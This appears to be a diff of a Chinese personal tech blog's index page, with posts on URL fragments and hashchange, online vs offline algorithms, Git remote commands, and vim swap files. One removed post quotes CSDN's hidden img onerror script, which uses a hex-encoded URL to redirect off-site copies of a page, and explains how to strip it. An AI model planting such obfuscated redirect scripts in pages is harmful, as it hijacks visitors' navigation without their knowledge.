+<p>​        得到和使用的是完整的url，比如window.location.href=”<a href="http://www.baidu.com”表示的是重新定向，页面跳转" target="_blank" rel="noopener">www.baidu.com”表示的是重新定向，页面跳转</a></p>
+<p>到新的页面。也可以通过window.location.href得到a标签的完整的href，比如<a href="#book">如果使用href，那</p>
+<p>么可以得到完整的链接（url）</p>
+<p>​    （2）window.location.hash</p>
+<p>​        得到的是锚链接。相比如href,通过window.location.hash并不会跳转到新的链接，只会在当前链接里面</p>
+<p>改变锚链。并且如果有<a href="#book">通过window.location.hash得不到完整的链接（URL），仅仅得到#book.</p>
+<p>window.location.hash简单应用</p>
+<p>一、#的涵义</p>
+<p>#代表网页中的一个位置。其右面的字符，就是该位置的标识符。比如，</p>
+<p>　　http://www.example.com/index.html#print</p>
+<p>就代表网页index.html的print位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。</p>
+<p>为网页位置指定标识符，有两个方法。一是使用锚点，比如<a name="print"></a>，二是使用id属性，比如<div id="print" >。</p>
+<p>二、HTTP请求不包括#</p>
+<p>#是用来指导浏览器动作的，对服务器端完全无用。所以，HTTP请求中不包括#。</p>
+<p>比如，访问下面的网址，</p>
+<p>　　<a href="http://www.example.com/index.html#print" target="_blank" rel="noopener">http://www.example.com/index.html#print</a></p>
+<p>浏览器实际发出的请求是这样的：</p>
+<p>　　GET /index.html HTTP/1.1</p>
+<p>　　Host: <a href="http://www.example.com/" target="_blank" rel="noopener">www.example.com</a></p>
+<p>可以看到，只是请求index.html，根本没有”#print”的部分。</p>
+<p>三、#后的字符</p>
+<p>在第一个#后面出现的任何字符，都会被浏览器解读为位置标识符。这意味着，这些字符都不会被发送到服务器端。</p>
+<p>比如，下面URL的原意是指定一个颜色值：</p>
+<p>　　<a href="http://www.example.com/?color=#fff" target="_blank" rel="noopener">http://www.example.com/?color=#fff</a></p>
+<p>但是，浏览器实际发出的请求是：</p>
+<p>　　GET /?color= HTTP/1.1</p>
+<p>　　Host: <a href="http://www.example.com/" target="_blank" rel="noopener">www.example.com</a></p>
+<p>可以看到，”#fff”被省略了。只有将#转码为%23，浏览器才会将其作为实义字符处理。也就是说，上面的网址应该被写成：</p>
+<p>　　<a href="http://example.com/?color=%23fff" target="_blank" rel="noopener">http://example.com/?color=%23fff</a></p>
+<p>四、改变#不触发网页重载</p>
+<p>单单改变#后的部分，浏览器只会滚动到相应位置，不会重新加载网页。</p>
+<p>比如，从</p>
+<p>　　<a href="http://www.example.com/index.html#location1" target="_blank" rel="noopener">http://www.example.com/index.html#location1</a></p>
+<p>改成</p>
+<p>　　<a href="http://www.example.com/index.html#location2" target="_blank" rel="noopener">http://www.example.com/index.html#location2</a></p>
+<p>浏览器不会重新向服务器请求index.html。</p>
+<p>五、改变#会改变浏览器的访问历史</p>
+<p>每一次改变#后的部分，都会在浏览器的访问历史中增加一个记录，使用”后退”按钮，就可以回到上一个位置。</p>
+<p>这对于ajax应用程序特别有用，可以用不同的#值，表示不同的访问状态，然后向用户给出可以访问某个状态的链接。</p>
+<p>值得注意的是，上述规则对IE 6和IE 7不成立，它们不会因为#的改变而增加历史记录。</p>
+<p>六、window.location.hash读取#值</p>
+<p>window.location.hash这个属性可读可写。读取时，可以用来判断网页状态是否改变；写入时，则会在不重载网页的前提下，创造一条访问历史记录。</p>
+<p>七、onhashchange事件</p>
+<p>这是一个HTML 5新增的事件，当#值发生变化时，就会触发这个事件。IE8+、Firefox 3.6+、Chrome 5+、Safari 4.0+支持该事件。</p>
+<p>它的使用方法有三种：</p>
+<p>　　window.onhashchange = func;</p>
+<p>　　&lt;body οnhashchange=”func();”&gt;</p>
+<p>　　window.addEventListener(“hashchange”, func, false);</p>
+<p>对于不支持onhashchange的浏览器，可以用setInterval监控location.hash的变化。</p>
+<p>八、Google抓取#的机制</p>
+<p>默认情况下，Google的网络蜘蛛忽视URL的#部分。</p>
+<p>但是，Google还规定，如果你希望Ajax生成的内容被浏览引擎读取，那么URL中可以使用”#!”，Google会自动将其后面的内容转成查询字符串_escaped_fragment_的值。</p>
+<p>比如，Google发现新版twitter的URL如下：</p>
+<p>　　<a href="http://twitter.com/#!/username" target="_blank" rel="noopener">http://twitter.com/#!/username</a></p>
+<p>就会自动抓取另一个URL：</p>
+<p>　　<a href="http://twitter.com/?_escaped_fragment_=/username" target="_blank" rel="noopener">http://twitter.com/?_escaped_fragment_=/username</a></p>
+<p>通过这种机制，Google就可以索引动态的Ajax内容。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/07/31/django/" data-id="ckfjo92580003ywel2kp533ij" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-在线算法" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/07/30/%E5%9C%A8%E7%BA%BF%E7%AE%97%E6%B3%95/" class="article-date">
+  <time datetime="2020-07-30T02:30:59.000Z" itemprop="datePublished">2020-07-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/30/%E5%9C%A8%E7%BA%BF%E7%AE%97%E6%B3%95/">在线算法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>我们常常会听到对于区间修改、区间查询等问题的处理时，大佬们口中说的“离线”，“在线”等名词，一开始自然是一脸蒙逼。</p>
+<p><strong>在线</strong>和<strong>离线</strong>可以简单的理解为<strong>对于所有的操作是否需要读入完毕</strong>。</p>
+<p>在线的要求是可以不用先知道所有的操作（类似询问、修改），边读入边执行，类似<strong>“走一步，做一步”</strong>的思想。</p>
+<p>离线则与在线相反，要求必须知道所有的操作，类似<strong>“记录所有步，回头再做”</strong>的思想，一般用Query[]记录所有操作。</p>
+<p>常见的在线算法：带有<strong>“可持久化”</strong>字样的（主席树（可持久化线段树）、可持久化字典树、etc），<del>其实正常写题时基本上都是在线的思路……</del></p>
+<p>常见的离线算法：整体二分、陈丹琦（CDQ）分治、莫队算法</p>
+<p>对于正常的题目来讲，两种算法其实都可以使用，经典的题目如：动态第K大问题（zoj 2112），解法有树套树（在线）和整体二分/CDQ分治（离线），但是区别在于：</p>
+<p>在线算法的思路相对简单，而代码量大（如某些毒瘤题），容易爆栈，赛场上及其考验心态（<del>菜逼表示早就炸了</del>）</p>
+<p>离线算法的思路相对复杂，而代码量小，建议选手多采用（毕竟代码越多，debug越困难）</p>
+<p>在线算法（online algorithm）和离线算法（offline algorithm）</p>
+<p>维基百科举了这样一个例子，选择排序是离线算法，而插入排序是在线算法。那就从这两个算法来看看在线算法和离线算法的区别。</p>
+<p>选择排序是不断地从未排序的元素中找到最大（小）的元素放到排序序列的起始位置。</p>
+<p>插入排序是不断将未排序的序列插入到有序的序列中，有序序列中的元素相对位置会在一定程度上被改变。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/07/30/%E5%9C%A8%E7%BA%BF%E7%AE%97%E6%B3%95/" data-id="ckfjo925d0006ywel139o46gz" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-python虚拟环境" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/07/10/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/" class="article-date">
@@ -162,572 +822,11 @@
 
 
   
-    <article id="post-csdn缓存问题" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/10/csdn%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/" class="article-date">
-  <time datetime="2020-07-10T00:59:07.000Z" itemprop="datePublished">2020-07-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/10/csdn%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/">csdn缓存问题</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开网页html，删除这段</p>
-<p>div style=”display:none;”<br>    &lt;img src=”<a href="https://blog.csdn.net/qq_41800366/article/details/86583789&quot;" target="_blank" rel="noopener">https://blog.csdn.net/qq_41800366/article/details/86583789&quot;</a> onerror=”setTimeout(function(){if(!/(csdn.net|iteye.com|baiducontent.com|googleusercontent.com|360webcache.com|sogoucdn.com|bingj.com|baidu.com)$/.test(window.location.hostname)){window.location.href=&quot;\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x63\x73\x64\x6e\x2e\x6e\x65\x74&quot;}},3000);”</p>
-<h1 id="解决CSDN博客文章-保存网页到本地后，页面显示不全的问题"><a href="#解决CSDN博客文章-保存网页到本地后，页面显示不全的问题" class="headerlink" title="解决CSDN博客文章 保存网页到本地后，页面显示不全的问题"></a>解决CSDN博客文章 保存网页到本地后，页面显示不全的问题</h1><p>在该文件夹下，执行下面的批处理（保存为.bat）。</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::清理<span class="selector-class">.js</span>文件</span><br><span class="line"><span class="selector-tag">del</span> *<span class="selector-class">.js</span>.下载</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/10/csdn%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98/" data-id="ckcrh5pbn00007sel0lsu771l" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-git" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/08/git/" class="article-date">
-  <time datetime="2020-07-08T14:06:22.000Z" itemprop="datePublished">2020-07-08</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/08/git/">Git远程操作</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p> <img src="http://www.ruanyifeng.com/blogimg/asset/2014/bg2014061202.jpg" alt="git"> </p>
-<h2 id="一、git-clone"><a href="#一、git-clone" class="headerlink" title="一、git clone"></a>一、git clone</h2><p>远程操作的第一步，通常是从远程主机克隆一个版本库，这时就要用到<code>git clone</code>命令。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone &lt;版本库的网址&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>比如，克隆jQuery的版本库。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:<span class="comment">//github.com/jquery/jquery.git</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>该命令会在本地主机生成一个目录，与远程主机的版本库同名。如果要指定不同的目录名，可以将目录名作为<code>git clone</code>命令的第二个参数。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone &lt;版本库的网址&gt; &lt;本地目录名&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><code>git clone</code>支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等，下面是一些例子。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git clone http[s]:<span class="comment">//example.com/path/to/repo.git/</span></span><br><span class="line">$ git clone ssh:<span class="comment">//example.com/path/to/repo.git/</span></span><br><span class="line">$ git clone git:<span class="comment">//example.com/path/to/repo.git/</span></span><br><span class="line">$ git clone /opt/git/project.git </span><br><span class="line">$ git clone file:<span class="comment">///opt/git/project.git</span></span><br><span class="line">$ git clone ftp[s]:<span class="comment">//example.com/path/to/repo.git/</span></span><br><span class="line">$ git clone rsync:<span class="comment">//example.com/path/to/repo.git/</span></span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2 id="二、git-remote"><a href="#二、git-remote" class="headerlink" title="二、git remote"></a>二、git remote</h2><p>为了便于管理，Git要求每个远程主机都必须指定一个主机名。<code>git remote</code>命令就用于管理主机名。</p>
-<p>不带选项的时候，<code>git remote</code>命令列出所有远程主机。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git remote</span><br><span class="line">origin</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>使用<code>-v</code>选项，可以参看远程主机的网址。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:jquery/jquery.git (fetch)</span><br><span class="line">origin  git@github.com:jquery/jquery.git (push)</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，当前只有一台远程主机，叫做origin，以及它的网址。</p>
-<p>克隆版本库的时候，所使用的远程主机自动被Git命名为<code>origin</code>。如果想用其他的主机名，需要用<code>git clone</code>命令的<code>-o</code>选项指定。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone -o jQuery https:<span class="comment">//github.com/jquery/jquery.git</span></span><br><span class="line">$ git remote</span><br><span class="line">jQuery</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，克隆的时候，指定远程主机叫做jQuery。</p>
-<p><code>git remote show</code>命令加上主机名，可以查看该主机的详细信息。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote show &lt;主机名&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><code>git remote add</code>命令用于添加远程主机。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add &lt;主机名&gt; &lt;网址&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><code>git remote rm</code>命令用于删除远程主机。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote rm &lt;主机名&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p><code>git remote rename</code>命令用于远程主机的改名。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote rename &lt;原主机名&gt; &lt;新主机名&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2 id="三、git-fetch"><a href="#三、git-fetch" class="headerlink" title="三、git fetch"></a>三、git fetch</h2><p>一旦远程主机的版本库有了更新（Git术语叫做commit），需要将这些更新取回本地，这时就要用到<code>git fetch</code>命令。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch &lt;远程主机名&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令将某个远程主机的更新，全部取回本地。</p>
-<p><code>git fetch</code>命令通常用来查看其他人的进程，因为它取回的代码对你本地的开发代码没有影响。</p>
-<p>默认情况下，<code>git fetch</code>取回所有分支（branch）的更新。如果只想取回特定分支的更新，可以指定分支名。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch &lt;远程主机名&gt; &lt;分支名&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>比如，取回<code>origin</code>主机的<code>master</code>分支。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin master</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>所取回的更新，在本地主机上要用”远程主机名/分支名”的形式读取。比如<code>origin</code>主机的<code>master</code>，就要用<code>origin/master</code>读取。</p>
-<p><code>git branch</code>命令的<code>-r</code>选项，可以用来查看远程分支，<code>-a</code>选项查看所有分支。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -r</span><br><span class="line">origin/master</span><br><span class="line"></span><br><span class="line">$ git branch -a</span><br><span class="line">* master</span><br><span class="line">  remotes/origin/master</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，本地主机的当前分支是<code>master</code>，远程分支是<code>origin/master</code>。</p>
-<p>取回远程主机的更新以后，可以在它的基础上，使用<code>git checkout</code>命令创建一个新的分支。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b newBrach origin/master</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，在<code>origin/master</code>的基础上，创建一个新分支。</p>
-<p>此外，也可以使用<code>git merge</code>命令或者<code>git rebase</code>命令，在本地分支上合并远程分支。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git merge origin/master</span><br><span class="line"># 或者</span><br><span class="line">$ git rebase origin/master</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示在当前分支上，合并<code>origin/master</code>。</p>
-<h2 id="四、git-pull"><a href="#四、git-pull" class="headerlink" title="四、git pull"></a>四、git pull</h2><p><code>git pull</code>命令的作用是，取回远程主机某个分支的更新，再与本地的指定分支合并。它的完整格式稍稍有点复杂。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>比如，取回<code>origin</code>主机的<code>next</code>分支，与本地的<code>master</code>分支合并，需要写成下面这样。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin next:master</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>如果远程分支是与当前分支合并，则冒号后面的部分可以省略。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin next</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，取回<code>origin/next</code>分支，再与当前分支合并。实质上，这等同于先做<code>git fetch</code>，再做<code>git merge</code>。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin</span><br><span class="line">$ git merge origin/next</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>在某些场合，Git会自动在本地分支与远程分支之间，建立一种追踪关系（tracking）。比如，在<code>git clone</code>的时候，所有本地分支默认与远程主机的同名分支，建立追踪关系，也就是说，本地的<code>master</code>分支自动”追踪”<code>origin/master</code>分支。</p>
-<p>Git也允许手动建立追踪关系。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --<span class="keyword">set</span>-upstream master origin/next</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令指定<code>master</code>分支追踪<code>origin/next</code>分支。</p>
-<p>如果当前分支与远程分支存在追踪关系，<code>git pull</code>就可以省略远程分支名。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，本地的当前分支自动与对应的<code>origin</code>主机”追踪分支”（remote-tracking branch）进行合并。</p>
-<p>如果当前分支只有一个追踪分支，连远程主机名都可以省略。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，当前分支自动与唯一一个追踪分支进行合并。</p>
-<p>如果合并需要采用rebase模式，可以使用<code>--rebase</code>选项。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull --rebase &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>如果远程主机删除了某个分支，默认情况下，<code>git pull</code> 不会在拉取远程分支的时候，删除对应的本地分支。这是为了防止，由于其他人操作了远程主机，导致<code>git pull</code>不知不觉删除了本地分支。</p>
-<p>但是，你可以改变这个行为，加上参数 <code>-p</code> 就会在本地删除远程已经删除的分支。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git pull -p</span><br><span class="line"># 等同于下面的命令</span><br><span class="line">$ git fetch --prune origin </span><br><span class="line">$ git fetch -p</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2 id="五、git-push"><a href="#五、git-push" class="headerlink" title="五、git push"></a>五、git push</h2><p><code>git push</code>命令用于将本地分支的更新，推送到远程主机。它的格式与<code>git pull</code>命令相仿。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>注意，分支推送顺序的写法是&lt;来源地&gt;:&lt;目的地&gt;，所以<code>git pull</code>是&lt;远程分支&gt;:&lt;本地分支&gt;，而<code>git push</code>是&lt;本地分支&gt;:&lt;远程分支&gt;。</p>
-<p>如果省略远程分支名，则表示将本地分支推送与之存在”追踪关系”的远程分支（通常两者同名），如果该远程分支不存在，则会被新建。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，将本地的<code>master</code>分支推送到<code>origin</code>主机的<code>master</code>分支。如果后者不存在，则会被新建。</p>
-<p>如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin :master</span><br><span class="line"># 等同于</span><br><span class="line">$ git push origin --<span class="keyword">delete</span> master</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示删除<code>origin</code>主机的<code>master</code>分支。</p>
-<p>如果当前分支与远程分支之间存在追踪关系，则本地分支和远程分支都可以省略。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，将当前分支推送到<code>origin</code>主机的对应分支。</p>
-<p>如果当前分支只有一个追踪分支，那么主机名都可以省略。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>如果当前分支与多个主机存在追踪关系，则可以使用<code>-u</code>选项指定一个默认主机，这样后面就可以不加任何参数使用<code>git push</code>。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push -u origin master</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令将本地的<code>master</code>分支推送到<code>origin</code>主机，同时指定<code>origin</code>为默认主机，后面就可以不加任何参数使用<code>git push</code>了。</p>
-<p>不带任何参数的<code>git push</code>，默认只推送当前分支，这叫做simple方式。此外，还有一种matching方式，会推送所有有对应的远程分支的本地分支。Git 2.0版本之前，默认采用matching方法，现在改为默认采用simple方式。如果要修改这个设置，可以采用<code>git config</code>命令。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global push.default matching</span><br><span class="line"># 或者</span><br><span class="line">$ git config --global push.default simple</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>还有一种情况，就是不管是否存在对应的远程分支，将本地的所有分支都推送到远程主机，这时需要使用<code>--all</code>选项。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push --all origin</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令表示，将所有本地分支都推送到<code>origin</code>主机。</p>
-<p>如果远程主机的版本比本地版本更新，推送时Git会报错，要求先在本地做<code>git pull</code>合并差异，然后再推送到远程主机。这时，如果你一定要推送，可以使用<code>--force</code>选项。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push --force origin </span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>上面命令使用<code>--force</code>选项，结果导致远程主机上更新的版本被覆盖。除非你很确定要这样做，否则应该尽量避免使用<code>--force</code>选项。</p>
-<p>最后，<code>git push</code>不会推送标签（tag），除非使用<code>--tags</code>选项。</p>
-<blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git push origin --tags</span><br></pre></td></tr></table></figure></blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/08/git/" data-id="ckcrh5pcx00067selau9tangn" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-linux-1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/07/linux-1/" class="article-date">
-  <time datetime="2020-07-07T10:12:54.000Z" itemprop="datePublished">2020-07-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/07/linux-1/">linux</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在Linux文件系统中，有两个特殊的符号也可以表示目录：</p>
-<ul>
-<li>“.”表示当前目录</li>
-<li>“..”表示当前目录的上一级目录</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/07/linux-1/" data-id="ckcrh5pc500017selgt4vceuv" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-vim" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/06/vim/" class="article-date">
-  <time datetime="2020-07-06T11:09:38.000Z" itemprop="datePublished">2020-07-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/06/vim/">vim 查看编辑文件，出现.swp文件的情况和处理方法</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="vim-查看编辑文件，出现-swp文件的情况和处理方法"><a href="#vim-查看编辑文件，出现-swp文件的情况和处理方法" class="headerlink" title="vim 查看编辑文件，出现.swp文件的情况和处理方法"></a>vim 查看编辑文件，出现.swp文件的情况和处理方法</h1><p><strong>在用vim打开一个文件时，会产生一个cmd.swap文件，用于保存数据：</strong></p>
-<p><strong>1、当编辑中的文件非正常关闭时，可用此.swp文件来恢复（非正常关闭时，不会被删除，所以提示存在.swap文件）；</strong></p>
-<p><strong>2、当编辑文件正常关闭时，此.swp文件会被删除；</strong></p>
-<p>解决办法：</p>
-<p>你可以使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r</span><br></pre></td></tr></table></figure>
-
-<p>来查看当前目录下的所有swp文件 </p>
-<p>你也可以使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r filename</span><br></pre></td></tr></table></figure>
-
-<p>来恢复文件，这样上次意外退出没有保存的修改，就会覆盖文件。</p>
-<p>然后用rm 命令删除交换文件。</p>
